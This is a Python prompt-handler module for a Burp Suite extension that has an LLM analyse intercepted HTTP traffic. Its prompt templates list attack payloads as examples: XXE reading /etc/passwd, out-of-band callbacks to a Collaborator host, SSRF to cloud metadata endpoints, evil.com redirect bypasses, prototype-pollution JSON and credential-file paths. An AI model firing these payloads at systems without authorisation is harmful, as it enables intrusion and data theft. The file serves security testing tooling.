# -*- coding: utf-8 -*-
# AgenticBurp - AI-Powered Security Analysis for Burp Suite
# prompt_handler.py -- Advanced prompt engineering for security analysis
#
# System prompt and user prompt templates are adapted from the
# Agentic Web Pentest project's multi-agent vulnerability analysis pipeline.

import re


SYSTEM_PROMPT = """You are an expert web application penetration tester with deep knowledge of OWASP Top 10, PortSwigger Web Security Academy, CVE exploitation, and modern attack techniques.

Your role is to analyze HTTP request/response pairs and identify security vulnerabilities with precision. You have expertise in:
- Injection: SQLi, NoSQLi, OS Command, SSTI, XXE, LDAP, XPath
- Authentication/Authorization: Auth bypass, JWT exploitation, OAuth/OIDC flaws, IDOR, BAC, BOLA, 2FA bypass
- JWT attacks: alg:none, RS256->HS256 confusion, kid injection, jku/x5u SSRF, weak secrets, claim tampering
- Client-side: XSS (Reflected/Stored/DOM), CSRF, Clickjacking, CORS misconfiguration, PostMessage
- Server-side: SSRF, Path Traversal, File Upload bypass, HTTP Request Smuggling, Cache Poisoning
- Deserialization: Java (ysoserial), PHP, Python pickle, .NET ViewState, JSON (Jackson/Gson), prototype pollution
- JavaScript analysis: hardcoded secrets, dangerous sinks, exposed endpoints, vulnerable libraries, source maps
- Sensitive file exposure: .env, config files, backup files, source code leaks, directory listing, .git exposure
- Business Logic: Race conditions, price tampering, mass assignment, flow bypass, integer overflow
- API Security: REST, GraphQL, WebSocket, gRPC attack surfaces
- Improper Input Validation: type coercion, boundary abuse, HPP, array injection, format strings, ReDoS, Content-Type confusion
- Open Redirect: URL/path/protocol-relative/encoded bypass, OAuth redirect_uri abuse
- CSRF: token absence/bypass, SameSite misconfiguration, JSON CSRF, login CSRF
- XXE: classic, blind OOB, SVG/XLSX/SOAP, XInclude, SSRF via XXE, Content-Type conversion to XML
- HTTP Header Injection: Host, X-Forwarded-For, X-Original-URL, CRLF, cache poisoning
- WebSocket Security: hijacking, auth bypass, message injection, SSRF
- Session Management: fixation, token entropy, post-logout reuse, insecure cookie attributes
- Rate Limiting: brute force protection bypass, IP rotation, OTP abuse
- Subdomain Takeover: dangling CNAME/DNS, unclaimed third-party services

When analyzing, you MUST:
1. Identify ALL potential vulnerabilities, even low-confidence ones
2. Provide SPECIFIC, ACTIONABLE proof-of-concept payloads tailored to the exact request
3. For JWT: decode the token, analyze header+payload claims, and craft exact exploit tokens
4. For JS responses: scan for hardcoded secrets, API keys, internal endpoints, dangerous sinks
5. For deserialization: identify serialized object signatures (rO0AB, O:4:, __proto__, @class)
6. For sensitive files: check URL patterns for backup/config/source code exposure indicators
7. Flag ALL missing security headers and explain the concrete risk for this endpoint
8. If no vulnerability is found, explain specifically WHY the endpoint appears secure

Output format MUST be structured Markdown. Each finding as a separate # section."""


DEFAULT_USER_PROMPT_TEMPLATE = """Perform a comprehensive security analysis of the following HTTP request/response pair.

## Target Information
- URL: {URL}
- Method: {METHOD}
- Protocol: HTTP/1.1

## HTTP Request
```
{REQUEST}
```

## HTTP Response
```http
{RESPONSE_STATUS_LINE}
{RESPONSE_HEADERS}

{RESPONSE_BODY_TRUNCATED}
```

---

## Out-of-Band Detection
Burp Collaborator URL for OOB/blind detection payloads: `{COLLABORATOR_URL}`
Use this URL in SSRF, blind SQLi (DNS/HTTP), blind XSS, XXE, and SSTI PoCs where applicable.

## Analysis Instructions

Analyze for ALL of the following vulnerability classes (mark N/A if not applicable):

**Injection:**
- SQL Injection (error-based, blind, time-based, UNION-based)
- NoSQL Injection (MongoDB operators: $where, $gt, $regex)
- OS Command Injection (;, &&, ||, backtick, $())
- Server-Side Template Injection (SSTI) ({{7*7}}, ${7*7}, <%= 7*7 %>)
- LDAP / XPath Injection
- HTML Injection / Template Injection in email/PDF generation

**XXE (XML External Entity) -- Full Coverage:**
- Classic XXE: read local files via `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- Blind XXE via OOB DNS/HTTP callback to Collaborator: `<!ENTITY % xxe SYSTEM "http://{COLLABORATOR_URL}/?x="> %xxe;`
- XXE via SVG upload: inject XML DOCTYPE in SVG file content
- XXE via XLSX/DOCX/ODT: ZIP-embedded XML files that accept external entities
- XXE via SOAP/XML API body: inject DOCTYPE before root element
- XXE to SSRF: use `SYSTEM "http://169.254.169.254/latest/meta-data/"` for cloud metadata
- XXE via `Content-Type: application/xml` conversion: change JSON body to XML and add DOCTYPE
- XInclude attacks (when DOCTYPE blocked): `<xi:include parse="text" href="file:///etc/passwd"/>`
- XXE parameter entity bypass for WAF evasion: split entity declaration across parameters

**Authentication & Authorization:**
- Authentication bypass (SQLi in login, default creds, parameter manipulation)
- IDOR / BOLA (enumerate ALL numeric/UUID/hash IDs in URL and body)
- Broken Access Control (horizontal + vertical privilege escalation)
- OAuth/OIDC parameter tampering (redirect_uri, state, scope, grant_type)
- 2FA/MFA bypass (code reuse, brute force, response manipulation, backup code)

**JWT Exploitation:**
- Algorithm confusion: alg:none attack (remove signature, set alg to "none")
- RS256 -> HS256 key confusion (sign with public key as HMAC secret)
- Weak secret brute force (check for common secrets: "secret", "password", "jwt")
- JWT header injection (jku, x5u, kid path traversal / SSRF)
- JWT claim tampering (exp, nbf, iat, sub, role, admin field manipulation)
- Expired token acceptance (check if server validates exp claim)
- Provide exact modified JWT tokens as PoC where applicable

**Client-Side:**
- Reflected XSS (check ALL parameters reflected in response)
- Stored XSS (user-controlled data stored and rendered)
- DOM XSS (JS sinks: innerHTML, document.write, eval, location.href)
- Clickjacking (missing X-Frame-Options, CSP frame-ancestors)

**CSRF -- Full Coverage:**
- Missing anti-CSRF token on all state-changing requests (POST/PUT/DELETE/PATCH)
- Weak/predictable CSRF token (static value, timestamp-based, user-ID-based)
- CSRF token not tied to session (token from one session accepted in another)
- Token present in URL instead of hidden form field or header (leaked via Referer)
- SameSite cookie attribute missing or set to None (enables cross-site request)
- CSRF via JSON body: server accepts `Content-Type: text/plain` allowing form-based CSRF
- CSRF via CORS: overly permissive CORS + credentialed requests enables CSRF equivalent
- Login CSRF: attacker logs victim into attacker's account to harvest victim's actions
- Provide a complete HTML PoC page demonstrating the CSRF attack for every finding

**Open Redirect:**
- URL parameter redirect: `?next=`, `?url=`, `?redirect=`, `?return=`, `?goto=`, `?dest=`, `?target=`, `?redir=`
- Path-based redirect: `/redirect/https://evil.com`, `/out?u=https://evil.com`
- Protocol-relative URL: `//evil.com`, `////evil.com`, `\/\/evil.com`
- URL encoded bypass: `%68%74%74%70%73%3A%2F%2Fevil.com`, `https:%0a//evil.com`
- Open redirect chained to OAuth: abuse `redirect_uri` parameter for token theft
- JavaScript-based redirect: `location.href`, `location.replace`, `window.location` set from user input
- Open redirect in response headers: check Location: header value is user-controlled
- Meta-refresh redirect: `<meta http-equiv="refresh" content="0;url=user_input">`

**CORS Misconfiguration:**
- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (impossible combo but check)
- Origin reflection: server echoes arbitrary `Origin:` header back in ACAO response header
- Null origin accepted: `Origin: null` reflected, exploitable via sandboxed iframe
- Subdomain wildcard: `Access-Control-Allow-Origin` set to attacker-controlled subdomain
- Pre-domain match: `trusted.com.evil.com` accepted if validation uses prefix match
- CORS on sensitive API endpoints: check `/api/`, `/account/`, `/admin/` endpoints specifically

**Content-Type Conversion Attacks:**
- Switch `Content-Type: application/json` -> `application/x-www-form-urlencoded` and vice versa
- Switch `Content-Type: application/json` -> `application/xml` and inject XXE DOCTYPE
- Switch `Content-Type: application/json` -> `text/plain` to bypass CSRF protection
- Multipart conversion: send JSON as `multipart/form-data` to bypass field-level validation
- Add/remove charset parameter: `Content-Type: application/json; charset=utf-7` for encoding attacks
- Accept header manipulation: `Accept: application/xml` to force XML response and trigger XXE
- Submit different content type than declared (mismatch) to confuse server-side parsing

**HTTP Header Injection & Request Manipulation:**
- Host header injection: tamper `Host:` for cache poisoning, password reset poisoning, SSRF
- X-Forwarded-For / X-Real-IP / X-Forwarded-Host injection to bypass IP-based restrictions
- X-Original-URL / X-Rewrite-URL for access control bypass (`X-Original-URL: /admin`)
- HTTP response splitting via CR/LF injection (`%0d%0a`) in redirect parameters or headers
- Transfer-Encoding header manipulation for request smuggling (CL.TE, TE.CL)
- Referer header manipulation on CSRF-protected endpoints that validate Referer origin
- Origin header spoofing for CORS bypass on same-site-only endpoints
- Cache-Control header injection to force caching of sensitive responses
- User-Agent / custom header injection when values are logged or processed server-side

**Server-Side:**
- SSRF (URL/host/ip/callback parameters, internal network probing)
- SSRF to cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP)
- SSRF bypass techniques: DNS rebinding, decimal IP (`2130706433` = 127.0.0.1), IPv6 (`[::1]`), URL scheme (`file://`, `gopher://`, `dict://`)
- Path Traversal / LFI (../../../etc/passwd, ..%2F..%2F, null byte, URL double-encoding)
- Unrestricted File Upload (MIME type bypass, double extension `.php.jpg`, polyglot files, null byte in filename)
- HTTP Request Smuggling (CL.TE, TE.CL, ambiguous headers)
- Cache Poisoning / Cache Deception
- Server-Side Request Forgery via file inclusion (`include`, `require`, `import` of user-supplied URL)

**WebSocket Security:**
- WebSocket hijacking (missing Origin validation -- test with cross-origin `Origin:` header)
- Lack of authentication on WebSocket upgrade (session cookie not validated at handshake)
- Message injection: inject malicious frames if input is reflected to other users
- WebSocket SSRF: WebSocket URL parameter controlled by user routes to internal services
- Bidirectional XSS via WebSocket messages rendered in DOM without sanitization

**Deserialization:**
- Java deserialization (ysoserial gadget chains, base64 rO0AB patterns in body/cookie)
- PHP deserialization (O:4:"User" patterns, __wakeup, __destruct magic methods)
- Python pickle deserialization (cookie/session data containing pickled objects)
- .NET ViewState deserialization (check __VIEWSTATE parameter, MAC disabled)
- JSON deserialization (Jackson, Gson type confusion, @class, @type fields)
- Node.js prototype pollution via JSON merge (__proto__, constructor.prototype)
- Identify serialized objects by signature bytes, base64 patterns, or Content-Type

**JavaScript Analysis:**
- Hardcoded secrets in JS files (API keys, tokens, passwords, endpoints)
- Exposed internal API endpoints referenced in JS source
- Dangerous JS sinks (eval, setTimeout with string, innerHTML, document.write)
- Source map files exposed (.map files leaking original source)
- Sensitive comments in JS (TODO, FIXME, credentials, internal URLs)
- Outdated/vulnerable JS libraries (jQuery < 3.5, Angular < 1.6, etc.)
- JSONP callbacks and dynamic script injection points
- PostMessage listeners without origin validation

**Sensitive File & Directory Exposure:**
- Directory listing enabled (check for index of / pattern in response)
- Backup files accessible (.bak, .old, .orig, .swp, .~, .tmp, Copy of)
- Configuration files exposed (.env, config.php, web.config, .htaccess, database.yml)
- Source code files (.git/config, .svn/entries, /.git/HEAD, WEB-INF/web.xml)
- Log files accessible (error.log, access.log, debug.log, application.log)
- Credentials files (id_rsa, .ssh/known_hosts, .aws/credentials, .bash_history)
- API documentation exposed (swagger.json, openapi.yaml, api-docs, /api/docs)
- Admin/management interfaces (phpMyAdmin, Adminer, Jenkins, Kibana, Grafana)
- Default pages (test.php, info.php, phpinfo.php, server-status, server-info)
- DS_Store / Thumbs.db metadata files leaking directory structure

**Directory Listing & Path Enumeration:**
- Enabled directory listing (Apache, Nginx, IIS default configs)
- Predictable file naming conventions visible in response
- Enumerate common paths based on URL pattern: /admin/, /backup/, /uploads/, /files/
- Check for robots.txt disallowed paths in context
- Parent directory traversal possibilities

**API Parameter & Improper Input Validation:**
- Missing or insufficient input validation on ALL parameters (query string, path, body, headers, cookies)
- Type coercion abuse: send string where integer expected, array where string expected, null/empty/boolean values
- Oversized input: extremely long strings, deeply nested JSON, large numeric values beyond expected range
- Unexpected data types accepted: `{"id": [1,2,3]}` where `{"id": 1}` expected; `{"role": true}` for privilege escalation
- Special characters not sanitized: `null`, `undefined`, `NaN`, `Infinity`, `-1`, `0`, `9999999999`
- Numeric boundary testing: max int (2147483647), int overflow (+1), negative values, float precision abuse
- Array/object injection in scalar fields: `param[]=value`, `param[0]=value` (PHP/Laravel array coercion)
- HTTP parameter pollution (HPP): duplicate parameters with conflicting values (`id=1&id=2`)
- API versioning bypass: test `/v1/`, `/v2/`, `/api/`, `/internal/` path variants on the same endpoint
- Missing field validation: required fields accepted as absent/null/empty without error
- Format string injection in parameters: `%s`, `%x`, `%n`, `{0}`, `#{7*7}` in any user-controlled field
- GraphQL-specific: query depth limit bypass, introspection enabled, batch query abuse, field suggestion leakage
- REST: undocumented HTTP methods accepted (PUT/DELETE/PATCH on read-only endpoints), missing method validation
- Content-Type confusion: send JSON body with `Content-Type: text/plain` or XML body with `Content-Type: application/json`
- JSON/XML structural abuse: duplicate keys in JSON object (parser confusion), XML entity nesting
- Prototype pollution via JSON merge: `{"__proto__": {"admin": true}}`, `{"constructor": {"prototype": {"admin": true}}}`
- Regex denial-of-service (ReDoS): send input crafted to trigger catastrophic backtracking in server-side validation

**Business Logic:**
- Race conditions (parallel request abuse for discounts, inventory, votes)
- Price / quantity / discount tampering in request body
- Mass assignment (extra JSON fields that may set privileged attributes)
- Business flow bypass (skipping payment, email verification, approval steps)
- Negative value / integer overflow abuse

**Rate Limiting & Brute Force Protection:**
- Missing rate limiting on login, OTP, password reset, coupon, and API endpoints
- Rate limit bypass via IP rotation headers: `X-Forwarded-For: <rotating-ip>`, `X-Real-IP`, `CF-Connecting-IP`
- Rate limit bypass by varying user-agent, adding padding to request, or changing case of credentials
- Account lockout policy absent or bypassable (no lockout after N failed attempts)
- OTP brute force: short numeric codes without rate limit on verification endpoint
- Credential stuffing exposure: no CAPTCHA or anomaly detection on authentication endpoints

**Subdomain Takeover & DNS Misconfiguration:**
- CNAME pointing to unclaimed third-party service (GitHub Pages, S3, Heroku, Fastly, Azure)
- Dangling DNS records: A record pointing to released cloud IP that can be reclaimed
- Detect by checking response for service-specific "not found" pages (GitHub 404, S3 NoSuchBucket, Heroku "no such app")
- Host header injection exploitable when multiple virtual hosts share the same IP

**Session Management:**
- Session token not invalidated after logout (replayable post-logout)
- Session fixation: session ID unchanged after login (`Set-Cookie` before vs. after auth)
- Session ID in URL (GET parameter) -- leaks via Referer, browser history, server logs
- Weak session token entropy (short, sequential, predictable pattern)
- Insecure cookie attributes: missing `HttpOnly`, missing `Secure`, missing `SameSite`
- Session not invalidated after password change or privilege escalation

**Information Disclosure:**
- API keys, tokens, credentials in response body or headers
- Internal IP addresses, hostnames, stack traces, error messages
- PII data exposure (emails, phone numbers, SSNs, credit card numbers)
- Security header audit:
  - Missing: Strict-Transport-Security, Content-Security-Policy,
    X-Frame-Options, X-Content-Type-Options, Referrer-Policy,
    Permissions-Policy, Cache-Control on sensitive endpoints
  - Overly permissive: Access-Control-Allow-Origin: *
  - Verbose: Server, X-Powered-By, X-AspNet-Version headers

**Potential CVE Identification:**
- Detect technology stack from response headers (Server, X-Powered-By, X-Generator,
  X-AspNet-Version, X-Runtime, Via) and response body clues (generator meta tags,
  framework signatures, error messages, JS libraries with version numbers).
- For each identified component with a version, map to known CVEs:
  - Apache HTTP Server, Nginx, IIS -> check for known RCE/path traversal CVEs
  - PHP version -> CVEs for that exact version (e.g. PHP 7.x type juggling, PHP 8.x CVEs)
  - WordPress/Joomla/Drupal core + plugins -> CVE-YYYY-NNNNN references
  - jQuery / Angular / React / Vue with pinned version -> known XSS/prototype pollution CVEs
  - OpenSSL version in Server header -> Heartbleed, POODLE, ROBOT, etc.
  - Java/Spring framework signatures -> Spring4Shell (CVE-2022-22965), Log4Shell (CVE-2021-44228)
  - Node.js / Express version disclosure -> relevant CVE list
  - Tomcat version -> CVE for that series (e.g. CVE-2020-1938 Ghostcat, CVE-2019-0232)
  - Struts version -> CVE-2017-5638, CVE-2018-11776, CVE-2023-50164
  - ASP.NET ViewState without MAC -> CVE references for deserialization
  - Third-party APIs/SDKs with version in response
- For each matched CVE provide: CVE ID, CVSS score, brief impact, whether this endpoint
  appears exploitable given the observed request/response.
- If no version is disclosed, note which components COULD have CVEs if version were known
  and recommend version disclosure remediation.

---

For each vulnerability found, provide the report in this EXACT format:

# [Vulnerability Name]
**Severity:** [Critical/High/Medium/Low/Informational]
**Confidence:** [Certain/Firm/Tentative]
**CVSS Score:** [0.0-10.0]
**Parameter/Location:** [exact parameter, header, or cookie name]
**CVE:** [CVE-YYYY-NNNNN or N/A]

## Issue Detail
[Precise explanation with specific evidence from this request/response]

## Proof of Concept
[Exact payload, modified request, or curl command ready to test]

## Issue Background
[Brief technical explanation of this vulnerability class]

## Remediation
[Specific, actionable fix for this exact endpoint and technology stack]

---
[Note: prompt was truncated: {IS_TRUNCATED_PROMPT}]"""


class PromptHandler(object):
    def __init__(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self.stdout = callbacks.getStdout()

    def _log(self, msg):
        if self.stdout:
            self.stdout.write("[PromptHandler] {0}\n".format(msg))

    def build_prompts(self, prompt_template, request_bytes, request_info, response_bytes,
                      max_request_chars=6000, max_response_chars=4000,
                      collaborator_url=""):
        """
        Build system_prompt and user_prompt from request/response data.
        Returns (system_prompt, user_prompt).
        """
        try:
            helpers = self._helpers

            # -- Request parts --------------------------------------------------
            url = str(request_info.getUrl())
            method = request_info.getMethod()
            req_headers_list = list(request_info.getHeaders())
            body_offset = request_info.getBodyOffset()

            req_headers_str = "\n".join(req_headers_list)
            req_body_str = helpers.bytesToString(request_bytes[body_offset:])
            full_request_str = helpers.bytesToString(request_bytes)

            # -- Response parts -------------------------------------------------
            resp_status_line = ""
            resp_headers_str = ""
            resp_body_str = ""
            full_response_str = ""

            if response_bytes and len(response_bytes) > 0:
                resp_info = helpers.analyzeResponse(response_bytes)
                resp_headers_list = list(resp_info.getHeaders())
                resp_status_line = resp_headers_list[0] if resp_headers_list else ""
                resp_headers_str = "\n".join(resp_headers_list[1:])
                resp_body_offset = resp_info.getBodyOffset()
                resp_body_str = helpers.bytesToString(response_bytes[resp_body_offset:])
                full_response_str = helpers.bytesToString(response_bytes)

            # -- Truncation -----------------------------------------------------
            is_truncated = False

            if len(full_request_str) > max_request_chars:
                full_request_str = full_request_str[:max_request_chars] + "\n... [truncated]"
                is_truncated = True

            if len(resp_body_str) > max_response_chars:
                resp_body_str = resp_body_str[:max_response_chars] + "\n... [truncated]"
                is_truncated = True

            if len(full_response_str) > (max_request_chars + max_response_chars):
                full_response_str = full_response_str[:(max_request_chars + max_response_chars)] + "\n... [truncated]"
                is_truncated = True

            # -- Fill template (single-pass to prevent prompt injection) --------
            # Sequential str.replace() allows injected {PLACEHOLDER} values in
            # one field to be substituted in a later pass. Single-pass regex
            # sub replaces all placeholders atomically, so injected text from
            # request/response data cannot hijack other placeholder slots.
            _subs = {
                "{URL}":                    url,
                "{METHOD}":                 method,
                "{REQUEST_HEADERS}":        req_headers_str,
                "{REQUEST_BODY}":           req_body_str,
                "{RESPONSE_STATUS_LINE}":   resp_status_line,
                "{RESPONSE_HEADERS}":       resp_headers_str,
                "{RESPONSE_BODY}":          resp_body_str,
                "{RESPONSE_BODY_TRUNCATED}":resp_body_str,
                "{REQUEST}":               full_request_str,
                "{RESPONSE}":              full_response_str,
                "{IS_TRUNCATED_PROMPT}":   str(is_truncated),
                "{COLLABORATOR_URL}":      collaborator_url or "N/A (Burp Collaborator not available)",
            }
            _pattern = re.compile("|".join(re.escape(k) for k in _subs))
            user_prompt = _pattern.sub(lambda m: _subs[m.group(0)], prompt_template)

            return SYSTEM_PROMPT, user_prompt

        except Exception as e:
            self._log("Error building prompts: {0}".format(str(e)))
            return SYSTEM_PROMPT, "Error building prompt: {0}".format(str(e))

    @staticmethod
    def get_default_template():
        return DEFAULT_USER_PROMPT_TEMPLATE

    @staticmethod
    def get_system_prompt():
        return SYSTEM_PROMPT
